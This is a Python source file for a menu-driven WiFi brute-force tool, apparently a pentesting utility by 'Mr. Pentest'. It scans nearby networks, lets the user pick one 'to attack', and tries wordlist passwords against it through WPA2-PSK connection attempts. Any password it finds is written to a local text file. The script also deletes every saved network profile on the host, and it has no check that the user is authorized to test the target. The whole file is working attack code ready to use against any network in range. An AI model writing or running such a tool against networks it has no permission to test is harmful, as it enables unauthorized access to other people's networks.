import pywifi
from pywifi import const
import time
import os
import sys

# ANSI color codes
RED = "\033[91m"
BLUE = "\033[94m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

# Global variables for selected WiFi and wordlist
selected_ssid = None
selected_bssid = None
selected_signal = None
wordlist_path = "wordlist.txt"
password_found = False
found_password = None

def print_banner(full=True):
    " Prints a stylish banner with or without details "
    os.system("cls" if os.name == "nt" else "clear")
    # Get terminal width
    try:
        import shutil
        terminal_width = shutil.get_terminal_size().columns
    except:
        terminal_width = 120  # Default width if unable to detect

    banner_lines = [
        "╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗",
       f"║             {RED}██{WHITE}╗    {RED}██{WHITE}╗  {RED}██{WHITE}╗ {RED}███████{WHITE}╗ {RED}██{WHITE}╗            {BLUE}██████{WHITE}╗{BLUE}██████{WHITE}╗  {BLUE}█████{WHITE}╗  {BLUE}██████{WHITE}╗{BLUE}██{WHITE}╗  {BLUE}██{WHITE}╗           ║",
       f"║            {RED}██{WHITE}║    {RED}██{WHITE}║  {RED}██{WHITE}║ {RED}██{WHITE}╔════╝ {RED}██{WHITE}║           {BLUE}██{WHITE}╔════╝{BLUE}██{WHITE}╔══{BLUE}██{WHITE}╗{BLUE}██{WHITE}╔══{BLUE}██{WHITE}╗{BLUE}██{WHITE}╔════╝{BLUE}██{WHITE}║ {BLUE}██{WHITE}╔╝          ║",
       f"║            {RED}██{WHITE}║ {RED}█{WHITE}╗ {RED}██{WHITE}║  {RED}██{WHITE}║ {RED}█████{WHITE}╗   {RED}██{WHITE}║           {BLUE}██{WHITE}║     {BLUE}██████{WHITE}╔╝{BLUE}███████{WHITE}║{BLUE}██{WHITE}║     {BLUE}█████{WHITE}╔╝           ║",
       f"║            {RED}██{WHITE}║{RED}███{WHITE}╗{RED}██{WHITE}║  {RED}██{WHITE}║ {RED}██{WHITE}╔══╝   {RED}██{WHITE}║           {BLUE}██{WHITE}║     {BLUE}██{WHITE}╔══{BLUE}██{WHITE}╗{BLUE}██{WHITE}╔══{BLUE}██{WHITE}║{BLUE}██{WHITE}║     {BLUE}██{WHITE}╔═{BLUE}██{WHITE}╗           ║",
       f"║            {WHITE}╚{RED}███{WHITE}╔{RED}███{WHITE}╔╝  {RED}██{WHITE}║ {RED}██{WHITE}║      {RED}██{WHITE}║           ╚{BLUE}██████{WHITE}╗{BLUE}██{WHITE}║  {BLUE}██{WHITE}║{BLUE}██{WHITE}║  {BLUE}██{WHITE}║╚{BLUE}██████{WHITE}╗{BLUE}██{WHITE}║  {BLUE}██{WHITE}╗          ║",
       f"║             {WHITE}╚══{WHITE}╝{WHITE}╚══{WHITE}╝   {WHITE}╚═{WHITE}╝ {WHITE}╚═{WHITE}╝      {WHITE}╚═{WHITE}╝            ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝          ║",
        "║                                                                                                     ║",
        "╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝",
        
        f"{CYAN}           WiFi Bruteforce Tool {RESET}",
        f"{YELLOW}================================================================================{RESET}",
        f"{GREEN}  Version: 1.0         Developed by Mr. Pentest         Use responsibly! {RESET}",
        f"{CYAN}  LinkedIn: https://www.linkedin.com/in/mr-pentest {RESET}",
        f"{YELLOW}================================================================================{RESET}" 
    ]

    # Calculate padding for each line to center the banner
    for line in banner_lines:
        # Strip ANSI color codes for width calculation
        clean_line = line
        for color in [RED, BLUE, GREEN, YELLOW, CYAN, WHITE, RESET]:
            clean_line = clean_line.replace(color, "")
        padding = (terminal_width - len(clean_line)) // 2
        print(" " * padding + line)

    if full and selected_ssid:
        separator = "-" * (terminal_width - 20)
        print(f"[{separator}]{RESET}")
        # Create consistent field width for labels and format string
        label_width = 15  # Width for all labels
        format_str = "{:<15}: {}"
        # Center each line with proper padding
        print(format_str.format(f"{YELLOW}                                                         Name             ", f"Wi-Fi Adapter{RESET}"))
        print(format_str.format(f"{YELLOW}                                                         Interface        ", f"{pywifi.PyWiFi().interfaces()[0].name()}{RESET}"))
        print(format_str.format(f"{YELLOW}                                                         Target           ", f"{CYAN}{selected_ssid} ({selected_bssid}){RESET}"))
        print(format_str.format(f"{YELLOW}                                                         Signal Strength  ", f"{GREEN}{selected_signal}%{RESET}"))
        print(format_str.format(f"{YELLOW}                                                         Wordlist         ", f"{CYAN}{wordlist_path}{RESET}"))

        print(f"[{separator}]{RESET}")

def scan_for_networks():
    """ Scan for available WiFi networks and return a list """
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    print(f"\n{CYAN}[+] Scanning for WiFi networks...{RESET}", end="")
    iface.scan()
    time.sleep(4)  # Wait for scanning

    networks = iface.scan_results()
    wifi_list = []

    if not networks:
        print(f"[-] No WiFi networks found. Try again.{RESET}")
        return []

    print(f"\n{YELLOW}Possible Wi-Fi Networks{RESET}")
    print(f"{GREEN}\nAvailable Networks: {len(networks)}{RESET}")

    for i, network in enumerate(networks):
        ssid = network.ssid if network.ssid else "Hidden_Network"
        signal = network.signal
        wifi_list.append((ssid, network.bssid, signal))

        print(f" {CYAN}{i + 1}. {ssid.ljust(25)}{YELLOW}...{signal}% {GREEN}({network.bssid}){RESET}")

    return wifi_list

def select_network():
    """ Perform scanning and let user select WiFi """
    global selected_ssid, selected_bssid, selected_signal

    wifi_list = scan_for_networks()
    if not wifi_list:
        return

    while True:
        try:
            choice = int(input(f"\n{YELLOW}[?] Enter network number to attack (or 0 to rescan): {RESET}"))
            if choice == 0:
                select_network()
                return
            elif 1 <= choice <= len(wifi_list):
                selected_ssid, selected_bssid, selected_signal = wifi_list[choice - 1]
                break
            else:
                print(f"[-] Invalid choice. Try again.{RESET}")
        except ValueError:
            print(f"[-] Invalid input. Try again.{RESET}")

    print_banner(full=True)  # Show selected network

def select_wordlist():
    """ Select a wordlist file for brute force """
    global wordlist_path

    while True:
        new_path = input(f"{YELLOW}[?] Enter new wordlist path (absolute or relative): {RESET}").strip()
        
        if os.path.isabs(new_path) or os.path.exists(new_path):
            wordlist_path = os.path.abspath(new_path)  # Convert to absolute path
            print(f"{GREEN}[+] Wordlist set: {wordlist_path}{RESET}")
            break
        else:
            print(f"[-] Wordlist file not found! Try again.{RESET}")

    print_banner(full=True)  # Refresh the banner


def brute_force_attack():
    """ Perform sequential brute-force attack using a wordlist """
    global selected_ssid, selected_bssid, selected_signal, wordlist_path, password_found, found_password

    if not selected_ssid:
        print(f"[-] No target selected! Run 'scan' first.{RESET}")
        return
    
    if not os.path.exists(wordlist_path):
        print(f"[-] Wordlist file not found! Run 'change wordlist' to set it.{RESET}")
        return

    print(f"\n{CYAN}[+] Starting Brute Force on '{selected_ssid}' ({selected_bssid}){RESET}")

    # Reset global flags
    password_found = False
    found_password = None

    # Try passwords sequentially
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as wordlist:
            for password in wordlist:
                password = password.strip()  # Remove leading/trailing whitespace only
                if not password:  # Skip empty lines
                    continue
                    
                print(f"\r{YELLOW}[*] Trying password: {password}{RESET}", end="", flush=True)
                if connect_to_wifi(password):
                    password_found = True
                    found_password = password
                    print(f"\n{GREEN}[+] Successfully connected to '{selected_ssid}' using password: {password}{RESET}")
                    break

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Attack interrupted by user. Returning to menu...{RESET}")
        return
    except Exception as e:
        print(f"\n[-] Error reading wordlist: {str(e)}{RESET}")
        return

    if found_password:
        # Reconnect with the found password
        print(f"\n{CYAN}[*] Reconnecting with the correct password...{RESET}")
        connect_to_wifi(found_password)
    else:
        print(f"\n[-] No valid password found.{RESET}")

def connect_to_wifi(password):
    """ Attempt to connect to the selected WiFi network with given password """
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        # Create a new profile
        profile = pywifi.Profile()
        profile.ssid = selected_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        # Remove all saved profiles
        iface.remove_all_network_profiles()

        # Add new profile
        temp_profile = iface.add_network_profile(profile)

        # Connect to network
        iface.connect(temp_profile)

        # Wait for connection result
        time.sleep(4)
        
        if iface.status() == const.IFACE_CONNECTED:
            # Save password to file
            with open(f"WiFi_{selected_ssid}_Password.txt", "w") as f:
                f.write(f"Network: {selected_ssid}\nBSSID: {selected_bssid}\nPassword: {password}")
            return True
        
        return False
    except Exception as e:
        print(f"\n[-] Connection error: {str(e)}{RESET}")
        return False

def show_help():
    """ Display available commands and their descriptions """
    commands = {
        "scan": "Scan for available WiFi networks",
        "attack": "Start brute-force attack on selected target",
        "change target": "Change the selected WiFi network",
        "change wordlist": "Change the path to the wordlist file",
        "clear": "Clear the screen and reprint the banner",
        "help": "Show this help message",
        "exit": "Exit the tool"
    }
    print(f"\n{YELLOW}Available Commands:{RESET}")
    for cmd, desc in commands.items():
        print(f"{CYAN}{cmd.ljust(15)}{RESET} - {desc}")

def menu():
    """ Main menu with command interface """
    print_banner()
    while True:
        try:
            command = input(f"\n{GREEN}bruteforcer$ {RESET}").strip().lower()

            if command == "scan":
                select_network()
            elif command == "attack":
                brute_force_attack()
            elif command == "change target":
                print_banner(full=False)
                select_network()
            elif command == "change wordlist":
                select_wordlist()
            elif command == "clear" :
                print_banner()
            elif command == "cls" :
                print_banner()
            elif command == "help":
                show_help()
            elif command == "exit":
                print(f"{RED}Exiting...{RESET}")
                sys.exit()
            else:
                print(f"{RED}[-] Invalid command. Type 'help' for available commands.{RESET}")
        except KeyboardInterrupt:
            print(f"\n{RED}Exiting...{RESET}")
            sys.exit()
            continue

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print_banner()
    menu()
    
